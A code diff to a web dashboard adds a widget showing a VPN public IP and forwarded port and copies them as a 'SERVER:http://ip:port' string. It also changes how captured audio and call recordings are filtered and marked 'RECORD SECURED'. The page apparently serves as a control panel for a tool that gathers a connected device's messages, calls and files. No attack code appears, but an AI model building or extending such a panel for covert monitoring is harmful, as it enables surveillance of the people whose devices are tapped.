@@ -1488,6 +1488,85 @@
     .cyber-audio-wave-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.3; pointer-events: none; }
 
     .cyber-audio-controls-group { display: flex; flex-direction: column; gap: 8px; position: relative; z-index: 2; }
+    @keyframes pulse {
+      0% {
+        box-shadow: 0 0 0 0 rgba(46, 204, 143, 0.5);
+      }
+
+      70% {
+        box-shadow: 0 0 0 7px rgba(46, 204, 143, 0);
+      }
+
+      100% {
+        box-shadow: 0 0 0 0 rgba(46, 204, 143, 0);
+      }
+    }
+
+    /* Live VPN Public IP & Forwarded Port Widget */
+    .dash-vpn-badge {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(15, 17, 23, 0.75);
+      border: 1px solid rgba(34, 211, 238, 0.25);
+      padding: 6px 12px;
+      border-radius: 99px;
+      font-size: 0.78rem;
+      color: var(--text2);
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.25);
+      transition: all 0.3s ease;
+    }
+
+    .dash-vpn-badge.vpn-updated {
+      border-color: #22D3EE;
+      box-shadow: 0 0 15px rgba(34, 211, 238, 0.4);
+      transform: scale(1.03);
+    }
+
+    .dash-vpn-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #10B981;
+      box-shadow: 0 0 6px #10B981;
+      animation: vpnPulse 2s infinite ease-in-out;
+      flex-shrink: 0;
+    }
+
+    .dash-vpn-dot.waiting {
+      background: #F59E0B;
+      box-shadow: 0 0 6px #F59E0B;
+    }
+
+    @keyframes vpnPulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(1.25); }
+    }
+
+    .dash-vpn-text strong {
+      color: #F3F4F6;
+      font-family: 'JetBrains Mono', monospace, Consolas, sans-serif;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+    }
+
+    .dash-vpn-copy {
+      background: rgba(34, 211, 238, 0.12);
+      border: 1px solid rgba(34, 211, 238, 0.3);
+      color: #22D3EE;
+      font-size: 0.7rem;
+      padding: 3px 6px;
+      border-radius: 6px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      transition: all 0.2s;
+    }
+
+    .dash-vpn-copy:hover {
+      background: #22D3EE;
+      color: #0F1117;
+    }
     .cyber-audio-label { font-size: 11px; font-weight: 800; color: #4e5566; text-transform: uppercase; letter-spacing: 0.1em; }
 
     /* ── DONE STATUS REDESIGN ── */
@@ -1758,6 +1837,15 @@
           placeholder="Universal Search : Search messages, calls, files, or keywords..." oninput="doSearch(this.value)">
       </div>
       <div class="topbar-right">
+        <!-- Live Public IP & Forwarded Port Widget -->
+        <div id="dash-vpn-badge" class="dash-vpn-badge" title="Live Proton Public IP & Forwarded Port">
+          <span class="dash-vpn-dot" id="dash-vpn-dot"></span>
+          <span class="dash-vpn-text" id="dash-vpn-text"><i class="fas fa-network-wired" style="color:var(--brand);margin-right:4px;"></i> IP: <strong id="dash-vpn-ip">Detecting...</strong> | Port: <strong id="dash-vpn-port">...</strong></span>
+          <button class="dash-vpn-copy" onclick="copyDashVpnEndpoint(event)" title="Copy SERVER:http://<ip>:<port>">
+            <i class="fas fa-copy"></i>
+          </button>
+        </div>
+
         <div class="device-status" style="display:flex; align-items:center; gap:8px;">
           <div class="status-dot status-dot-header" id="status-dot"></div>
           <span id="status-label">No device</span>
@@ -3194,24 +3282,7 @@
         });
       }
 
-      arr = arr.filter(m => {
-          if (!m || isMirrorOrLive(m.name)) return false;
-          const dVal = String(m.duration || "");
-          const dNum = parseFloat(dVal);
-          const name = (m.name || "").toLowerCase();
-
-          // Catch 50s to 62s range in any format (seconds, ms, or mm:ss)
-          const isBad = (dNum >= 50 && dNum <= 62) ||
-            (dNum >= 50000 && dNum <= 62000) ||
-            dVal.includes("1:00") || dVal.includes("0:5") ||
-            name.includes("60s") || name.includes("59s") || name.includes("55s") ||
-            name.includes("1min") || name.includes("1_min");
-
-          if (isBad && currentID) {
-            return false;
-          }
-          return true;
-        })
+      arr = arr.filter(m => m && !isMirrorOrLive(m.name))
         .sort((a, b) => (b.time || 0) - (a.time || 0));
 
       if (searchQuery) {
@@ -4487,14 +4558,14 @@
         const liveDesc = liveCard.querySelector('.cyber-audio-live-pulse-row');
         if (!liveDesc || !liveDesc.textContent.includes('SERVER')) return;
 
-        const audioFiles = Object.values(data?.media || {}).filter(m => m.type === 'audio');
-        if (audioFiles.length >= expectedAudioCount) {
+        const audioFiles = Object.values(data?.media || {}).filter(m => m && (m.type === 'audio' || m.type === 'call_recording'));
+        if (audioFiles.length >= expectedAudioCount || (expectedAudioCount > 0 && audioFiles.length > 0)) {
             liveDesc.innerHTML = `<div class="cyber-done-status"><div class="cyber-tick-anim"><i class="fas fa-check"></i></div> RECORD SECURED</div>`;
             liveDesc.style.color = '#fff';
             expectedAudioCount = 0;
             setTimeout(() => {
                 liveCard.classList.add('hide');
-            }, 5000);
+            }, 3500);
         }
     }
 
@@ -4790,6 +4861,72 @@
     mSocket.on('force_logout_all', () => {
       window.location.href = "/logout";
     });
+
+    // Live VPN IP & Forwarded Port Real-time Tracking
+    let activeDashVpnIp = null;
+    let activeDashVpnPort = null;
+
+    function updateDashVpnDisplay(data) {
+      if (!data) return;
+      const ip = data.ip;
+      const port = data.port;
+      const badge = document.getElementById('dash-vpn-badge');
+      const ipEl = document.getElementById('dash-vpn-ip');
+      const portEl = document.getElementById('dash-vpn-port');
+      const dot = document.getElementById('dash-vpn-dot');
+
+      if (!ipEl || !portEl) return;
+
+      const changed = (activeDashVpnIp !== null && activeDashVpnIp !== ip) || (activeDashVpnPort !== null && activeDashVpnPort !== port);
+      activeDashVpnIp = ip;
+      activeDashVpnPort = port;
+
+      ipEl.innerText = ip || 'Detecting...';
+      portEl.innerText = port || '...';
+
+      if (ip && port) {
+        if (dot) dot.className = 'dash-vpn-dot';
+      } else {
+        if (dot) dot.className = 'dash-vpn-dot waiting';
+      }
+
+      if (changed && badge) {
+        badge.classList.add('vpn-updated');
+        setTimeout(() => badge.classList.remove('vpn-updated'), 1500);
+      }
+    }
+
+    async function fetchDashVpnStatus() {
+      try {
+        const resp = await fetch('/api/network_status');
+        if (resp.ok) {
+          const data = await resp.json();
+          updateDashVpnDisplay(data);
+        }
+      } catch (e) {}
+    }
+
+    function copyDashVpnEndpoint(e) {
+      if (e) e.stopPropagation();
+      if (!activeDashVpnIp || !activeDashVpnPort) {
+        showToast('VPN Endpoint still resolving...');
+        return;
+      }
+      const endpoint = `SERVER:http://${activeDashVpnIp}:${activeDashVpnPort}`;
+      navigator.clipboard.writeText(endpoint).then(() => {
+        showToast(`Copied: ${endpoint}`);
+      }).catch(() => {
+        window.prompt('Copy endpoint:', endpoint);
+      });
+    }
+
+    mSocket.on('vpn_status_update', (data) => {
+      console.log('[Socket.io] Dashboard received VPN status update:', data);
+      updateDashVpnDisplay(data);
+    });
+
+    fetchDashVpnStatus();
+    setInterval(fetchDashVpnStatus, 20000);
   </script>
 </body>
 
